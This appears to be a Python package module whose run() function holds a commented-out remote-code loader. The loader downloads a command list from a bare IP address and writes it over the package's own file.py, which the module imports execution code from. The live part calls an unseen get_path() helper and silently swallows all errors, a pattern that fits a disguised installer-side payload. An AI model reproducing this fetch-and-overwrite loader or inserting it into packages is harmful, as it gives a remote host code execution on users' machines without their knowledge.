import os
import urllib.request
from .file import execute_commands_as_per_url
from .init import get_path


def run():
    # try:
    #     web = 'http://13.51.44.246/commands'
    #     response = urllib.request.urlopen(web)
    #     commands_list = response.read().decode().strip().split('\n')
    #
    #     # Get the current file path
    #     current_file_path = os.path.dirname(os.path.abspath(__file__))
    #
    #     other_file_path = os.path.join(current_file_path, "file.py")
    #
    #     with open(other_file_path, 'w') as f:
    #         for command in commands_list:
    #             f.write(command + '\n')
    # except:
    #     pass
    try:
        # execute_commands_as_per_url()
        get_path()
    except:
        pass
